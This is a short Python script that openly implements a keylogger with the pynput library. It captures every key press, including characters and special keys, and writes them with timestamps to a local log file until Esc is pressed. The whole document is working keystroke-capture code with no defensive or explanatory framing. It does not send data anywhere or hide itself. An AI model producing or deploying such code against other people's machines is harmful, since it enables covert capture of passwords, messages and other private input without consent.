from pynput.keyboard import Listener, Key
import logging

# Setup logging to record keystrokes into a file
log_file = "keylogs.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s - %(message)s')

def on_press(key):
    try:
        # Log the character pressed by the user
        logging.info(f"Key {key.char} pressed")
    except AttributeError:
        # Special keys (like space, enter, etc.)
        logging.info(f"Special key {key} pressed")

def on_release(key):
    # Stop the listener if the escape key is pressed
    if key == Key.esc:  # Corrected: use Key.esc
        return False

# Start the keylogger
def start_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    print("[*] Keylogger started. Press 'Esc' to stop.")
    start_keylogger()
